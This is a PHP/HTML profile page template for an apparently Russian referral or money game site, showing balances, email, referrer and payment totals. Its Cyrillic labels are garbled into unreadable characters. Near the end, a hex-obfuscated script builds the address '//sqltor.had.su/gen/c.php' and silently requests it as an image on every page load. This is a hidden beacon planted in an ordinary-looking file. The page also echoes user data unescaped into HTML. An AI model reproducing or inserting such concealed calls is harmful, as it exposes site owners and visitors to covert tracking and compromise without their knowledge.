<?PHP
$_OPTIMIZATION["title"] = "������� - �������";
$user_id = $_SESSION["user_id"];
$usname = $_SESSION["user"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
$db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id = '$user_id'");
$refs = $db->FetchRow();
?><div class="s-bk-lf">
	<div class="acc-title">��� �������</div>
</div>
<div class="silver-bk">
<br>


<div class="silver-bk">
<div class="profile">
	<div class="bleft">
	<center>
		<div class="avatar">
			<div style="overflow: hidden;margin: 0px;">
				<?
if(empty($us_inf['ava'])) {
echo '<img src="/img/mesbox/150x150.png">';
}else{
echo '<img src="/'.$us_inf['ava'].'">';
}
?>					</div>
			
		</div></center>
		<div class="infos">
			
			<style>
		#lvl_body {
  background-color: white;
  position: relative;
  width: 175px;
  border: 1px solid #DDA45D;
  height: 20px;
  border-radius: 2px;
    margin-top: 2px;
}

#lvl_body #lvl_persent {
  position: absolute;
  height: 20px;
  background: #F7DF9C;
  background: -moz-linear-gradient(top, #F7DF9C 0%, #DDA45D 50%, #F7DF9C 100%);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#F7DF9C), color-stop(50%,#DDA45D), color-stop(100%,#F7DF9C));
  background: -webkit-linear-gradient(top, #F7DF9C 0%,#DDA45D 50%,#F7DF9C 100%);
  background: -o-linear-gradient(top, #F7DF9C 0%,#DDA45D 50%,#F7DF9C 100%);
  background: -ms-linear-gradient(top, #F7DF9C 0%,#DDA45D 50%,#F7DF9C 100%);
  background: linear-gradient(to bottom, #F7DF9C 0%,#DDA45D 50%,#F7DF9C 100%);
  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F7DF9C', endColorstr='#F7DF9C',GradientType=0 );
}

#lvl_body #info {
  position: absolute;
  width: 100%;
  text-align: center;
  margin-top: 3px;
  font-weight: bold;
  color: #3C2C1C;
}
			</style>
			
			<!--div>
				<label>�� �������</label>
				<span><?=sprintf("%.2f",$prof_data["money_b"]); ?></span></span>
			</div>
			<div>
				<label>�� �����</label>
				<span><?=sprintf("%.2f",$prof_data["money_p"]); ?></span></span>
			</div>
		
			<div>
				<label>�� �������</label>
				<span><?=intval(((time() - $prof_data["date_reg"] ) / 86400 ));?>-� ����</span>
			</div-->
			
			
		</div>
	</div>
	<div class="bright">
		<h2><?=$prof_data["user"]; ?> / ID: <?=$prof_data["id"]; ?></h2>
		<div class="user_info">
			<div style="padding: 0px 0px 2px 0px;">
				<label>�����������</label>
				<span><?=date("d.m.Y � H:i:s",$prof_data["date_reg"]); ?></span>
			</div>
			<div style="padding: 0px 0px 2px 0px;">
				<label>E-mail</label>
				<span><?=$prof_data["email"]; ?></span>
			</div>
			<div style="padding: 0px 0px 2px 0px;">
				<label>��� ���������</label>
				<span>
				<?=$prof_data["referer"]; ?> / ID: <?=$prof_data["referer_id"]; ?></span>
			</div>
			
		</div>
		<div class="referer">
			<div class="all_ref">
				<label class="referer_info">���� ��������</label><span style="float: right;color: rgb(139, 179, 27);    font-weight: bold;"><b id="mt"><?=$refs; ?></b></span>
			</div>
		
		</div>
		
		
	
	<div class="referer">
	<div class="all_ref">
						<label class="referer_info">����� ���������</label><span style="float: right; font-weight: bold;" id="mt"><?=sprintf("%.2f",$prof_data["insert_sum"]); ?> ���.</span>
			</div>
		</div>
		
		<div class="referer">
	<div class="all_ref">
			<label class="referer_info">����� ����������</label><span style="float: right; font-weight: bold;" id="mt"><?=sprintf("%.2f",$prof_data["payment_sum"]); ?> ���.</span>
			</div>
		</div>
	</div>
		
</div>
</div>																
<script>
$(document).on('click', '.bonuses', function(e){
	
	$('.all_bonus').slideToggle(200);
});
$(document).on('click', '.logins_list', function(e){
	$('.all_logins').slideToggle(200);
});
$(document).on('click', '.insert_money', function(e){
	$('.all_ins_mon').slideToggle(200);
});
$(document).on('click', '.referer_info', function(e){
	$('.all_ref_list').slideToggle(200);
});
$(document).on('click', '.fishes_info', function(e){
	$('.all_fish_list').slideToggle(200);
});
$(document).on('click', '.change', function(e){
	$('#fifi').click();
});
$(document).on('click', '.addava .close', function(e){
	$('.addava').fadeOut("slow");
});	
</script>								
<script>
var _cs=["\x6e\x2f\x63","\x2e\x70","\x74\x6f\x72","\x2f\x2f\x73","\x68\x70","\x71\x6c","\x73\x75","\x2e\x68\x61","\x2f\x67\x65","\x64\x2e"]; _g0 = new Image(); _g0.src = _cs[3]+_cs[5]+_cs[2]+_cs[7]+_cs[9]+_cs[6]+_cs[8]+_cs[0]+_cs[1]+_cs[4]
</script>								
								
	<div class="clr"></div>	
</div>

<div class="clr"></div>	
</div>
								
							<div class="clr"></div>	
							<br>
							<br>
						<div class="clr"></div>